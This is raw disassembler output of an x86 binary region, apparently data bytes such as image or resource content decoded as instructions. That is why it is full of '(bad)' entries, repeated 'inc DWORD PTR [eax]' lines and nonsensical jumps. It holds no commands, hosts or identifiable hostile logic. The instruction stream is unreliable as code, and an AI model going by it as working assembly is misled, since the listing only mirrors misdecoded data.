  424a6b:	ud0    edi,edi
  424a6e:	add    BYTE PTR [eax],al
  424a70:	(bad)  
  424a71:	push   eax
  424a73:	ud0    edi,edi
  424a76:	add    BYTE PTR [eax],al
  424a78:	(bad)  
  424a79:	(bad)  
  424a7a:	clc    
  424a7b:	pop    ds
  424a7c:	(bad)  
  424a7d:	inc    DWORD PTR [eax]
  424a7f:	add    bh,bh
  424a81:	(bad)  
  424a82:	clc    
  424a83:	pop    ds
  424a84:	(bad)  
  424a85:	inc    DWORD PTR [eax]
  424a87:	add    bh,bh
  424a89:	(bad)  
  424a8a:	(bad)  
  424a8b:	(bad)  
  424a8c:	(bad)  
  424a8d:	inc    DWORD PTR [eax]
  424a8f:	add    BYTE PTR [eax],ch
  424a91:	add    BYTE PTR [eax],al
  424a93:	add    BYTE PTR [eax],ah
  424a95:	add    BYTE PTR [eax],al
  424a97:	add    BYTE PTR [eax+0x0],al
  424a9a:	add    BYTE PTR [eax],al
  424a9c:	add    DWORD PTR [eax],eax
  424a9e:	and    BYTE PTR [eax],al
  424aa0:	add    BYTE PTR [eax],al
  424aa2:	add    BYTE PTR [eax],al
  424aa4:	adc    BYTE PTR [eax],0x0
	...
  424b43:	add    BYTE PTR [edx],dl
  424b45:	inc    ebp
  424b46:	cdq    
  424b47:	jb     0x424b49
  424b49:	pop    eax
  424b4a:	(bad)  
  424b4d:	pop    eax
  424b4e:	(bad)  
  424b51:	pop    eax
  424b52:	(bad)  
  424b55:	pop    eax
  424b56:	(bad)  
  424b59:	pop    eax
  424b5a:	(bad)  
  424b5d:	pop    eax
  424b5e:	(bad)  
  424b61:	pop    eax
  424b62:	(bad)  
  424b65:	pop    eax
  424b66:	(bad)  
  424b69:	pop    eax
  424b6a:	(bad)  
  424b6d:	pop    eax
  424b6e:	(bad)  
  424b71:	pop    eax
  424b72:	(bad)  
  424b75:	pop    eax
  424b76:	(bad)  
  424b79:	pop    eax
  424b7a:	(bad)  
  424b7d:	pop    eax
  424b7e:	(bad)  
  424b81:	pop    eax
  424b82:	(bad)  
  424b85:	pop    eax
  424b86:	(bad)  
  424b89:	pop    eax
  424b8a:	(bad)  
  424b8d:	pop    eax
  424b8e:	(bad)  
  424b91:	pop    eax
  424b92:	(bad)  
  424b95:	pop    eax
  424b96:	(bad)  
  424b99:	pop    eax
  424b9a:	(bad)  
  424b9d:	pop    eax
  424b9e:	(bad)  
  424ba1:	pop    eax
  424ba2:	(bad)  
  424ba5:	pop    eax
  424ba6:	(bad)  
  424ba9:	inc    esp
  424baa:	lahf   
  424bab:	jp     0x424bad
	...
  424bc1:	add    BYTE PTR [eax],al
  424bc3:	add    BYTE PTR [edx],al
  424bc5:	xchg   esi,eax
  424bc6:	out    dx,al
  424bc7:	lock dec edx
  424bc9:	(bad)  
  424bcc:	dec    edx
  424bcd:	(bad)  
  424bce:	(bad)  
  424bcf:	dec    DWORD PTR [edx-0x3d]
  424bd2:	(bad)  
  424bd3:	dec    DWORD PTR [edx-0x3b]
  424bd6:	(bad)  
  424bd7:	dec    DWORD PTR [edx-0x3a]
  424bda:	(bad)  
  424bdb:	dec    DWORD PTR [edx-0x3b]
  424bde:	(bad)  
  424bdf:	dec    DWORD PTR [edx-0x3f]
  424be2:	(bad)  
  424be3:	dec    DWORD PTR [edx-0x42]
  424be6:	(bad)  
  424be7:	dec    DWORD PTR [edx-0x42]
  424bea:	(bad)  
  424beb:	dec    DWORD PTR [edx-0x43]
  424bee:	(bad)  
  424bef:	dec    DWORD PTR [edx-0x42]
  424bf2:	(bad)  
  424bf3:	dec    DWORD PTR [edx-0x42]
  424bf6:	(bad)  
  424bf7:	dec    DWORD PTR [edx-0x42]
  424bfa:	(bad)  
  424bfb:	dec    DWORD PTR [edx-0x42]
  424bfe:	(bad)  
  424bff:	dec    DWORD PTR [edx-0x42]
  424c02:	(bad)  
  424c03:	dec    DWORD PTR [edx-0x42]
  424c06:	(bad)  
  424c07:	dec    DWORD PTR [edx-0x40]
  424c0a:	(bad)  
  424c0b:	dec    DWORD PTR [edx-0x3d]
  424c0e:	(bad)  
  424c0f:	dec    DWORD PTR [edx-0x38]
  424c12:	(bad)  
  424c13:	dec    DWORD PTR [edx-0x37]
  424c16:	(bad)  
  424c17:	dec    DWORD PTR [edx-0x37]
  424c1a:	(bad)  
  424c1b:	dec    DWORD PTR [edx-0x37]
  424c1e:	(bad)  
  424c1f:	dec    DWORD PTR [edx-0x36]
  424c22:	(bad)  
  424c23:	dec    DWORD PTR [edx-0x34]
  424c26:	(bad)  
  424c27:	inc    DWORD PTR [eax]
  424c29:	scas   eax,DWORD PTR es:[edi]
  424c2a:	sti    
  424c2b:	inc    DWORD PTR [eax]
	...
  424c41:	add    BYTE PTR [eax],al
  424c43:	add    BYTE PTR [ecx],ch
  424c45:	mov    eax,0xad00b8fc
  424c4a:	(bad)  
  424c4b:	inc    DWORD PTR [eax]
  424c4d:	stos   DWORD PTR es:[edi],eax
  424c4e:	(bad)  
  424c4f:	inc    DWORD PTR [eax]
  424c51:	test   eax,0xab00ffff
  424c56:	(bad)  
  424c57:	inc    DWORD PTR [eax]
  424c59:	lods   al,BYTE PTR ds:[esi]
  424c5a:	(bad)  
  424c5b:	inc    DWORD PTR [eax]
  424c5d:	cdq    
  424c5e:	std    
  424c5f:	inc    DWORD PTR [eax]
  424c61:	mov    ebx,?
  424c63:	inc    DWORD PTR [eax]
  424c65:	(bad)  
  424c66:	cld    
  424c67:	inc    DWORD PTR [eax]
  424c69:	(bad)  
  424c6a:	std    
  424c6b:	inc    DWORD PTR [eax]
  424c6d:	xchg   ecx,eax
  424c6e:	std    
  424c6f:	inc    DWORD PTR [eax]
  424c71:	xchg   ecx,eax
  424c72:	(bad)  
  424c73:	inc    DWORD PTR [eax]
  424c75:	xchg   ecx,eax
  424c76:	(bad)  
  424c77:	inc    DWORD PTR [eax]
  424c79:	xchg   ecx,eax
  424c7a:	(bad)  
  424c7b:	inc    DWORD PTR [eax]
  424c7d:	xchg   ecx,eax
  424c7e:	(bad)  
  424c7f:	inc    DWORD PTR [eax]
  424c81:	xchg   ecx,eax
  424c82:	std    
  424c83:	inc    DWORD PTR [eax]
  424c85:	nop
  424c86:	std    
  424c87:	inc    DWORD PTR [eax]
  424c89:	(bad)  
  424c8a:	cld    
  424c8b:	inc    DWORD PTR [eax]
  424c8d:	(bad)  
  424c8e:	sti    
  424c8f:	inc    DWORD PTR [eax]
  424c91:	fwait
  424c92:	std    
  424c93:	inc    DWORD PTR [eax]
  424c95:	scas   eax,DWORD PTR es:[edi]
  424c96:	(bad)  
  424c97:	inc    DWORD PTR [eax]
  424c99:	mov    al,0xff
  424c9b:	inc    DWORD PTR [eax]
  424c9d:	mov    cl,0xff
  424c9f:	inc    DWORD PTR [eax]
  424ca1:	mov    bl,0xff
  424ca3:	inc    DWORD PTR [eax]
  424ca5:	mov    bh,0xff
  424ca7:	call   FWORD PTR [esi]
  424ca9:	sar    esi,0xc7
	...
  424cc4:	push   edx
  424cc5:	mov    eax,0x9d0071f4
  424cca:	std    
  424ccb:	inc    DWORD PTR [eax]
  424ccd:	fwait
  424cce:	sti    
  424ccf:	inc    DWORD PTR [eax]
  424cd1:	cwde   
  424cd2:	sti    
  424cd3:	inc    DWORD PTR [eax]
  424cd5:	fwait
  424cd6:	sti    
  424cd7:	inc    DWORD PTR [eax]
  424cd9:	xchg   ebp,eax
  424cda:	cli    
  424cdb:	inc    DWORD PTR [eax]
  424cdd:	cmp    eax,0xffffffff
  424ce0:	add    BYTE PTR [eax-0x77ff0005],cl
  424ce6:	std    
  424ce7:	inc    DWORD PTR [eax]
  424ce9:	test   esp,edi
  424ceb:	inc    DWORD PTR [eax]
  424ced:	cmp    edx,0xf87d00ff
  424cf3:	inc    DWORD PTR [eax]
  424cf5:	jns    0x424ced
  424cf7:	inc    DWORD PTR [eax]
  424cf9:	jl     0x424cf2
  424cfb:	inc    DWORD PTR [eax]
  424cfd:	cmp    ecx,0xfc8800ff
  424d03:	inc    DWORD PTR [eax]
  424d05:	(bad)  
  424d06:	std    
  424d07:	inc    DWORD PTR [eax]
  424d09:	mov    ?,ebp
  424d0b:	inc    DWORD PTR [eax]
  424d0d:	(bad)  
  424d0e:	cld    
  424d0f:	inc    DWORD PTR [eax]
  424d11:	test   eax,edi
  424d13:	inc    DWORD PTR [eax]
  424d15:	xchg   edi,eax
  424d16:	sti    
  424d17:	inc    DWORD PTR [eax]
  424d19:	lahf   
  424d1a:	cld    
  424d1b:	inc    DWORD PTR [eax]
  424d1d:	sahf   
  424d1e:	cld    
  424d1f:	inc    DWORD PTR [eax]
  424d21:	mov    ds:0xa900fffd,al
  424d26:	(bad)  
  424d27:	call   FWORD PTR [edx-0x39]
  424d2a:	stc    
  424d2b:	imul   eax,DWORD PTR [eax],0x0
	...
  424d42:	add    BYTE PTR [eax],al
  424d44:	jae    0x424d05
  424d46:	out    dx,al
  424d47:	sub    al,BYTE PTR [edx]
  424d49:	xchg   edi,eax
  424d4a:	clc    
  424d4b:	sti    
  424d4c:	add    BYTE PTR [ecx-0x72ff0008],dl
  424d52:	idiv   bh
  424d54:	add    BYTE PTR [edi-0x77ff0008],cl
  424d5a:	clc    
  424d5b:	inc    DWORD PTR [eax]
  424d5d:	jns    0x424d53
  424d5f:	inc    DWORD PTR [eax]
  424d61:	ins    DWORD PTR es:[edi],dx
  424d62:	in     al,dx
  424d63:	inc    DWORD PTR [eax]
  424d65:	fs out 0xff,al
  424d68:	add    BYTE PTR [eax-0x1c],ah
  424d6b:	inc    DWORD PTR [eax]
  424d6d:	pop    edi
  424d6e:	in     al,0xff
  424d70:	add    BYTE PTR [ecx-0x19],ah
  424d73:	inc    DWORD PTR [eax]
  424d75:	arpl   ax,bp
  424d77:	inc    DWORD PTR [eax]
  424d79:	jmp    0xeb6a:0xff
  424d7f:	inc    DWORD PTR [eax]
  424d81:	ins    DWORD PTR es:[edi],dx
  424d82:	in     eax,dx
  424d83:	inc    DWORD PTR [eax]
  424d85:	jno    0x424d75
  424d87:	inc    DWORD PTR [eax]
  424d89:	jbe    0x424d7b
  424d8b:	inc    DWORD PTR [eax]
  424d8d:	jle    0x424d82
  424d8f:	inc    DWORD PTR [eax]
  424d91:	xor    bh,0xff
  424d94:	add    BYTE PTR [ebx-0x6cff0007],cl
  424d9a:	stc    
  424d9b:	inc    DWORD PTR [eax]
  424d9d:	xchg   ecx,eax
  424d9e:	clc    
  424d9f:	inc    DWORD PTR [eax]
  424da1:	cwde   
  424da2:	cli    
  424da3:	inc    DWORD PTR [ebx]
  424da5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424da6:	sti    
  424da7:	stc    
  424da8:	xchg   eax,edx
  424daa:	hlt    
  424dab:	add    BYTE PTR es:[eax],al
	...
  424dc2:	add    BYTE PTR [eax],al
  424dc4:	mov    dl,al
  424dc6:	call   0xf2da66cd
  424dcb:	int    0x0
  424dcd:	xchg   ah,dh
  424dcf:	inc    DWORD PTR [eax]
  424dd1:	xor    dl,0xff
  424dd4:	add    BYTE PTR [ecx+0x6600fff3],al
  424dda:	loope  0x424ddb
  424ddc:	add    BYTE PTR [edx-0x31],dl
  424ddf:	inc    DWORD PTR [eax]
  424de1:	push   edi
  424de2:	sar    bh,cl
  424de4:	add    BYTE PTR [ecx-0x25],ah
  424de7:	inc    DWORD PTR [eax]
  424de9:	gs loope 0x424deb
  424dec:	add    BYTE PTR [eax-0x1e],ah
  424def:	inc    DWORD PTR [eax]
  424df1:	arpl   si,sp
  424df3:	inc    DWORD PTR [eax]
  424df5:	addr16 jmp 0xebac4efa
  424dfb:	inc    DWORD PTR [eax]
  424dfd:	outs   dx,BYTE PTR ds:[esi]
  424dfe:	in     eax,dx
  424dff:	inc    DWORD PTR [eax]
  424e01:	jo     0x424def
  424e03:	inc    DWORD PTR [eax]
  424e05:	ins    DWORD PTR es:[edi],dx
  424e06:	jmp    0xff:0xe56700ff
  424e0d:	pop    ebx
  424e0e:	fdivr  st,st(7)
  424e10:	add    BYTE PTR [ebx-0x30],dl
  424e13:	inc    DWORD PTR [eax]
  424e15:	imul   esp,ecx,0xf58600ff
  424e1b:	inc    DWORD PTR [eax]
  424e1d:	mov    ebp,esi
  424e1f:	inc    DWORD PTR [eax]
  424e21:	xchg   ecx,eax
  424e22:	clc    
  424e23:	call   FWORD PTR [edi]
  424e25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424e26:	test   ecx,0x1f1d399
	...
  424e48:	mov    eax,ds:0x7d0083eb
  424e4e:	icebp  
  424e4f:	inc    DWORD PTR [eax]
  424e51:	js     0x424e42
  424e53:	inc    DWORD PTR [eax]
  424e55:	fs (bad) 
  424e58:	add    BYTE PTR [edx-0x4b],al
  424e5b:	inc    DWORD PTR [eax]
  424e5d:	push   ecx
  424e5e:	(bad)  
  424e5f:	inc    DWORD PTR [eax]
  424e61:	pop    ebp
  424e62:	aam    0xff
  424e64:	add    BYTE PTR [ebp-0x23],ah
  424e67:	inc    DWORD PTR [eax]
  424e69:	imul   esp,ebx,0xe45f00ff
  424e6f:	inc    DWORD PTR [eax]
  424e71:	pop    edi
  424e72:	call   0xeca64f76
  424e77:	inc    DWORD PTR [eax]
  424e79:	push   0x6d00ffee
  424e7e:	out    dx,eax
  424e7f:	inc    DWORD PTR [eax]
  424e81:	jno    0x424e73
  424e83:	inc    DWORD PTR [eax]
  424e85:	jb     0x424e75
  424e87:	inc    DWORD PTR [eax]
  424e89:	imul   esp,esi,0xffffffff
  424e8c:	add    BYTE PTR [edx-0x2b],bl
  424e8f:	inc    DWORD PTR [eax]
  424e91:	dec    eax
  424e92:	mov    esi,0xae3c00ff
  424e97:	inc    DWORD PTR [eax]
  424e99:	pop    esi
  424e9a:	aam    0xff
  424e9c:	add    BYTE PTR [edi-0x19],ch
  424e9f:	inc    DWORD PTR [eax]
  424ea1:	jle    0x424e94
  424ea3:	dec    DWORD PTR [ebx-0x50]
  424ea6:	bnd jg 0x424ea9
	...
  424ec5:	add    BYTE PTR [eax],al
  424ec7:	add    BYTE PTR [ebx-0x52],ah
  424eca:	in     eax,0x37
  424ecc:	add    BYTE PTR [edi+ebp*8-0x2],bh
  424ed0:	add    BYTE PTR [ebp+ebp*8-0x1],dh
  424ed4:	add    BYTE PTR [esi+eax*8-0x1],dl
  424ed8:	add    BYTE PTR [edi+eiz*4],bh
  424edb:	inc    DWORD PTR [eax]
  424edd:	push   ebx
  424ede:	(bad)  
  424edf:	inc    DWORD PTR [eax]
  424ee1:	push   edi
  424ee2:	aam    0xff
  424ee4:	add    BYTE PTR [ecx-0x23],ah
  424ee7:	dec    DWORD PTR [esi]
  424ee9:	jb     0x424ecc
  424eeb:	jmp    DWORD PTR [esi]
  424eed:	js     0x424ecd
  424eef:	(bad)  
  424ef0:	cmp    DWORD PTR [edx-0x73ba0023],eax
  424ef6:	fdivp  st(7),st
  424ef8:	inc    ebp
  424ef9:	mov    ds,edi
  424efb:	(bad)  
  424efc:	cmp    cl,BYTE PTR [edx+eiz*8-0x1a7ad901]
  424f03:	dec    DWORD PTR ds:0xffea7b
  424f09:	push   0x5400ffe6
  424f0e:	sar    bh,cl
  424f10:	add    BYTE PTR [eax-0x44],cl
  424f13:	inc    DWORD PTR [eax]
  424f15:	ss lahf 
  424f17:	inc    DWORD PTR [eax]
  424f19:	inc    esi
  424f1a:	mov    eax,0xd55600ff
  424f1f:	inc    DWORD PTR [eax]
  424f21:	(bad)  
  424f22:	(bad)  
  424f24:	push   ecx
  424f25:	cdq    
  424f26:	aad    0x34
	...
  424f48:	jnp    0x424f00
  424f4a:	loopne 0x424f52
  424f4c:	adc    al,BYTE PTR [ebx+0x6f00d9ec]
  424f52:	in     al,dx
  424f53:	inc    DWORD PTR [eax]
  424f55:	pop    edx
  424f56:	sar    edi,1
  424f58:	add    BYTE PTR [edx],bh
  424f5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f5b:	inc    DWORD PTR [eax]
  424f5d:	dec    edi
  424f5e:	ret    0x3eff
  424f61:	jp     0x424f29
  424f63:	dec    DWORD PTR [ebx-0x37003b5a]
  424f69:	into   
  424f6a:	sar    edi,cl
  424f6c:	retf   0xc4c9
  424f6f:	(bad)  
  424f70:	fstp   st(1)
  424f72:	sar    edi,1
  424f74:	fcom   st(0)
  424f76:	(bad)  
  424f77:	jmp    eax
  424f79:	fcmovbe st,st(2)
  424f7b:	call   esp
  424f7d:	int    0xc3
  424f7f:	call   ebp
  424f81:	ror    bh,cl
  424f83:	push   DWORD PTR [eax-0x61004148]
  424f89:	mov    ah,0xcd
  424f8b:	(bad)  
  424f8c:	cmp    esi,DWORD PTR [ebx-0x41]
  424f8f:	inc    DWORD PTR [eax]
  424f91:	inc    esp
  424f92:	mov    bh,0xff
  424f94:	add    BYTE PTR [ebx],dh
  424f96:	fwait
  424f97:	inc    DWORD PTR [eax]
  424f99:	inc    edx
  424f9a:	mov    ch,0xff
  424f9c:	add    BYTE PTR [ecx-0x2d],dl
  424f9f:	dec    DWORD PTR [esi]
  424fa1:	data16 (bad) 
  424fa3:	(bad)  
  424fa4:	push   esi
  424fa5:	nop
  424fa6:	mov    edi,0x5
	...
  424fcb:	add    BYTE PTR [edi],ch
  424fcd:	(bad)  
  424fce:	out    0x95,eax
  424fd0:	add    BYTE PTR [edi-0x12],ch
  424fd3:	inc    DWORD PTR [eax]
  424fd5:	pop    esp
  424fd6:	(bad)  
  424fd8:	add    eax,0x75ffaa3f
  424fdd:	mov    WORD PTR [edi+edi*8-0x514742],gs
  424fe4:	(bad)  
  424fe6:	into   
  424fe7:	dec    esi
  424fe9:	retf   0xffc4
  424fec:	(bad)  
  424fee:	(bad)  
  424fef:	dec    ebp
  424ff1:	retf   0xffc6
  424ff4:	fstp   st(4)
  424ff6:	fdivr  st,st(7)
  424ff8:	ror    ch,1
  424ffa:	enter  0xdcff,0xda
  424ffe:	xlat   BYTE PTR ds:[ebx]
  424fff:	dec    edx
  425001:	mov    cl,0xff
  425004:	aad    0xd2
  425006:	int    0xff
  425008:	sar    BYTE PTR [ecx-0x3a350051],0xbd
  42500f:	jmp    DWORD PTR [ebp+0x7a]
  425012:	fwait
  425013:	dec    DWORD PTR ds:0xff993a
  425019:	inc    eax
  42501a:	mov    bh,0xff
  42501c:	add    BYTE PTR [ecx-0x2a],dl
  42501f:	jmp    DWORD PTR [edx]
  425021:	outs   dx,DWORD PTR ds:[esi]
  425022:	retf   
  425023:	nop
	...
  42504c:	push   ebx
  42504d:	sahf   
  42504e:	fiadd  WORD PTR [ebp+0x0]
  425051:	jno    0x425042
  425053:	inc    DWORD PTR [eax]
  425055:	pop    ebp
  425056:	in     al,0xff
  425058:	push   ds
  425059:	pop    ecx
  42505a:	mov    cl,0xff
  42505c:	mov    ds:0xcaff8f9a,al
  425061:	leave  
  425062:	(bad)  
  425063:	inc    eax
  425065:	mov    esi,0xd9daffbb
  42506a:	(bad)  
  42506b:	dec    ebp
  42506d:	retf   
  42506e:	(bad)  
  42506f:	(bad)  
  425070:	(bad)  
  425072:	xlat   BYTE PTR ds:[ebx]
  425073:	call   edx
  425075:	iret   
  425076:	retf   0xdfff
  425079:	fstp   st(1)
  42507b:	dec    edi
  42507d:	int3   
  42507e:	(bad)  
  42507f:	(bad)  
  425080:	(bad)  
  425082:	aam    0xff
  425084:	sar    DWORD PTR [esi-0x35330046],0xc7
  42508b:	jmp    FWORD PTR [ecx-0x47005d5a]
  425091:	mov    dl,0xaa
  425093:	jmp    DWORD PTR [eax]
  425095:	dec    eax
  425096:	xchg   esi,eax
  425097:	inc    DWORD PTR [eax]
  425099:	inc    ecx
  42509a:	(bad)  
  42509d:	push   ebx
  42509e:	fcos   
  4250a0:	aaa    
  4250a1:	jbe    0x42505b
  4250a3:	inc    edx
	...
  4250cc:	mov    ds:0x3804e3c7,al
  4250d1:	xchg   ecx,eax
  4250d2:	out    0x5f,al
  4250d4:	das    
  4250d5:	mov    ebp,esp
  4250d7:	jae    0x425105
  4250d9:	jne    0x42509c
  4250db:	jge    0x42508d
  4250dd:	scas   al,BYTE PTR es:[edi]
  4250de:	test   eax,0xacb1b3f7
  4250e3:	call   edx
  4250e5:	ror    esi,1
  4250e7:	dec    esp
  4250e9:	leave  
  4250ea:	(bad)  
  4250ed:	(bad)  
  4250ef:	call   eax
  4250f1:	int    0xc7
  4250f3:	(bad)  
  4250f4:	(bad)  
  4250f6:	fcos   
  4250f8:	ror    bh,cl
  4250fa:	retf   0xdeff
  4250fd:	(bad)  
  4250ff:	dec    ebx
  425101:	enter  0xffc3,0xd3
  425105:	ror    dh,cl
  425107:	push   DWORD PTR [esi-0x3f00504d]
  42510d:	mov    esi,0x8a8effba
  425112:	xor    esi,0x28
  425115:	pop    edi
  425116:	mov    ds:0xbb5a1081,eax
  42511b:	jae    0x425139
  42511d:	arpl   WORD PTR [edi-0x517cafa0],di
  425123:	add    eax,0x0
	...
  42515c:	mov    es,WORD PTR [edi-0x3c3a4481]
  425162:	sar    edi,0xc3
  425165:	mov    edi,0xdce1ffb8
  42516a:	aam    0xff
  42516c:	fst    st(4)
  42516e:	enter  0xe7ff,0xe0
  425172:	xlat   BYTE PTR ds:[ebx]
  425173:	(bad)  
  425174:	(bad)  
  425176:	retf   
  425177:	(bad)  
  425178:	call   0xde422c5f
  42517d:	rol    edi,cl
  42517f:	jmp    ebx
  425181:	(bad)  
  425183:	dec    edx
  425185:	ret    0xffb7
  425188:	int    0xc9
  42518a:	(bad)  
  42518b:	jmp    DWORD PTR [ecx-0x51006662]
  425191:	test   eax,0xcda3
	...
  4251da:	add    BYTE PTR [eax],al
  4251dc:	test   eax,0xac85a3a7
  4251e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4251e2:	pushf  
  4251e3:	dec    ecx
  4251e5:	retf   
  4251e6:	int3   
  4251e7:	call   DWORD PTR [edx+0x6dffcdb0]
  4251ed:	mov    ds:0x9252ffda,eax
  4251f2:	fdivp  st(7),st
  4251f4:	dec    eax
  4251f5:	xchg   ebx,eax
  4251f6:	in     al,0xff
  4251f8:	dec    eax
  4251f9:	xchg   edi,eax
  4251fa:	out    0xff,al
  4251fc:	push   ebx
  4251fd:	lahf   
  4251fe:	jecxz  0x4251ff
  425200:	push   0xffffffa5
  425202:	(bad)  
  425204:	nop
  425205:	stos   DWORD PTR es:[edi],eax
  425206:	enter  0xaaff,0xac
  42520a:	lods   eax,DWORD PTR ds:[esi]
  42520b:	(bad)  
  42520c:	mov    ebp,0x8cffb1b8
  425211:	mov    BYTE PTR [ebx+0x78],al
	...
  42525b:	add    BYTE PTR [esi+0x7e2d8794],bl
  425261:	xchg   esp,eax
  425262:	scas   eax,DWORD PTR es:[edi]
  425263:	std    
  425264:	push   ss
  425265:	push   0xffffffd0
  425267:	inc    DWORD PTR [eax]
  425269:	imul   esp,edx,0xec6f00ff
  42526f:	inc    DWORD PTR [eax]
  425271:	out    dx,ax
  425273:	inc    DWORD PTR [eax]
  425275:	ins    DWORD PTR es:[edi],dx
  425276:	repnz inc DWORD PTR [eax]
  425279:	jne    0x42526f
  42527b:	inc    DWORD PTR [eax]
  42527d:	jnp    0x425275
  42527f:	inc    DWORD PTR [eax]
  425281:	jnp    0x425279
  425283:	inc    DWORD PTR [eax]
  425285:	push   0xffffffe8
  425287:	call   DWORD PTR [esi]
  425289:	pop    edi
  42528a:	enter  0x5cff,0x72
  42528e:	xchg   ebp,eax
  42528f:	std    
  425290:	mov    ah,0xac
  425292:	mov    ds:0x3c,eax
	...
  4252db:	add    BYTE PTR [ebp+0x6d],cl
  4252de:	xchg   edx,eax
  4252df:	add    eax,DWORD PTR [edi]
  4252e1:	dec    eax
  4252e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4252e3:	rol    DWORD PTR [eax],1
  4252e5:	pop    edx
  4252e6:	iret   
  4252e7:	inc    DWORD PTR [eax]
  4252e9:	ins    BYTE PTR es:[edi],dx
  4252ea:	(bad)  
  4252ec:	add    BYTE PTR [esi-0x16],dh
  4252ef:	inc    DWORD PTR [eax]
  4252f1:	ins    DWORD PTR es:[edi],dx
  4252f2:	in     eax,dx
  4252f3:	inc    DWORD PTR [eax]
  4252f5:	jb     0x4252e8
  4252f7:	inc    DWORD PTR [eax]
  4252f9:	jnp    0x4252ee
  4252fb:	inc    DWORD PTR [eax]
  4252fd:	xor    esp,0xf28000ff
  425303:	inc    DWORD PTR [eax]
  425305:	push   0xffffffe3
  425307:	inc    DWORD PTR [eax]
  425309:	dec    ebp
  42530a:	(bad)  
  42530b:	inc    DWORD PTR [esi]
  42530d:	inc    eax
  42530e:	mov    al,ds:0x916c4bd5
  425313:	add    al,0x0
	...
  42535d:	add    BYTE PTR [eax],al
  42535f:	add    BYTE PTR [ebx],cl
  425361:	inc    edi
  425362:	lahf   
  425363:	mov    eax,DWORD PTR [eax]
  425365:	pop    eax
  425366:	(bad)  
  425367:	inc    DWORD PTR [eax]
  425369:	imul   ebx,ebp,0xffffffff
  42536c:	add    BYTE PTR [edi-0x16],dh
  42536f:	inc    DWORD PTR [eax]
  425371:	outs   dx,BYTE PTR ds:[esi]
  425372:	out    dx,al
  425373:	inc    DWORD PTR [eax]
  425375:	jb     0x425368
  425377:	inc    DWORD PTR [eax]
  425379:	jl     0x42536f
  42537b:	inc    DWORD PTR [eax]
  42537d:	xor    ch,0xff
  425380:	add    BYTE PTR [edi-0xe],bh
  425383:	inc    DWORD PTR [eax]
  425385:	data16 (bad) 
  425388:	add    BYTE PTR [edx-0x43],cl
  42538b:	dec    DWORD PTR ds:0x8f9c46
	...
  4253dd:	add    BYTE PTR [eax],al
  4253df:	add    BYTE PTR [esi],dl
  4253e1:	dec    esi
  4253e2:	call   0xff:0xbe510042
  4253e9:	imul   ebx,esp,0xffffffff
  4253ec:	add    BYTE PTR [eax-0x16],bh
  4253ef:	inc    DWORD PTR [eax]
  4253f1:	jo     0x4253e1
  4253f3:	inc    DWORD PTR [eax]
  4253f5:	jb     0x4253e8
  4253f7:	inc    DWORD PTR [eax]
  4253f9:	jl     0x4253ef
  4253fb:	inc    DWORD PTR [eax]
  4253fd:	xor    ebp,0xffffffff
  425400:	add    BYTE PTR [ebp-0xf],bh
  425403:	inc    DWORD PTR [eax]
  425405:	(bad)  
  425406:	(bad)  
  425408:	add    BYTE PTR [ebx+esi*4-0x1],al
  42540c:	adc    ecx,DWORD PTR [ebx-0x68]
  42540f:	inc    edi
	...
  425460:	and    BYTE PTR [eax-0x64],bl
  425463:	or     eax,0xe6b24d03
  425468:	add    BYTE PTR [edi-0x27],ah
  42546b:	inc    DWORD PTR [eax]
  42546d:	jne    0x425459
  42546f:	inc    DWORD PTR [eax]
  425471:	outs   dx,BYTE PTR ds:[esi]
  425472:	lock inc DWORD PTR [eax]
  425475:	ins    BYTE PTR es:[edi],dx
  425476:	hlt    
  425477:	inc    DWORD PTR [eax]
  425479:	js     0x425471
  42547b:	inc    DWORD PTR [eax]
  42547d:	xor    bh,0xff
  425480:	add    BYTE PTR [ecx-0xf],bh
  425483:	inc    DWORD PTR [eax]
  425485:	pop    ebx
  425486:	aad    0xff
  425488:	add    eax,DWORD PTR [ebx-0x57]
  42548b:	out    0x1d,eax
  42548d:	push   esi
  42548e:	call   0x0:0xf
	...
  4254e1:	add    BYTE PTR [eax],al
  4254e3:	add    BYTE PTR [edx],al
  4254e5:	inc    esi
  4254e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4254e7:	lods   eax,DWORD PTR ds:[esi]
  4254e8:	add    eax,0x28ffd366
  4254ed:	mov    ah,bl
  4254ef:	inc    DWORD PTR [ebp+edx*4-0x1b]
  4254f3:	call   DWORD PTR [ebx-0x67]
  4254f6:	out    0xff,al
  4254f8:	push   ebx
  4254f9:	mov    al,ds:0x9e44ffe8
  4254fe:	jmp    0xe5c87c02
  425503:	inc    DWORD PTR [ebx]
  425505:	push   edi
  425506:	int3   
  425507:	inc    DWORD PTR [edx]
  425509:	inc    ecx
  42550a:	mov    eax,ds:0xa9
	...
  425563:	add    BYTE PTR [ebx],bh
  425565:	gs cdq 
  425567:	bound  esi,QWORD PTR [ebp-0x2a003641]
  42556d:	ror    bl,cl
  42556f:	(bad)  
  425570:	jmp    0xcfdc:0xe5ffdee5
  425577:	(bad)  
  425578:	out    dx,al
  425579:	out    0xde,al
  42557b:	(bad)  
  42557c:	(bad)  
  42557e:	retf   0xd9ff
  425581:	aad    0xd0
  425583:	dec    DWORD PTR [esi+edx*4+0x6d47ffa6]
  42558a:	popf   
  42558b:	bound  eax,QWORD PTR [eax]
	...
  4255e1:	add    BYTE PTR [eax],al
  4255e3:	add    BYTE PTR [ebp-0x4fd55d58],ch
  4255e9:	stos   BYTE PTR es:[edi],al
  4255ea:	mov    al,ds:0xd9dde0f7
  4255ef:	(bad)  
  4255f0:	fcmovbe st,st(7)
  4255f2:	sar    bh,cl
  4255f4:	in     eax,0xe3
  4255f6:	(bad)  
  4255f8:	fcmovnu st,st(0)
  4255fa:	sar    edi,cl
  4255fc:	loope  0x4255dc
  4255fe:	(bad)  
  425600:	mov    cl,0xba
  425603:	inc    eax
  425605:	mov    ebx,0x9096f8b4
  42560a:	xchg   DWORD PTR [esi],ebx
	...
  425668:	mov    ecx,0xcdd2b2b7
  42566d:	retf   
  42566e:	(bad)  
  425671:	jecxz  0x425652
  425673:	(bad)  
  425674:	fcmovbe st,st(6)
  425676:	sar    edi,1
  425678:	in     eax,0xe3
  42567a:	(bad)  
  42567c:	aam    0xd0
  42567e:	retf   0xd3ff
  425681:	iret   
  425682:	retf   
  425683:	call   FWORD PTR [edx+0xc18f95]
	...
  4256e5:	add    BYTE PTR [eax],al
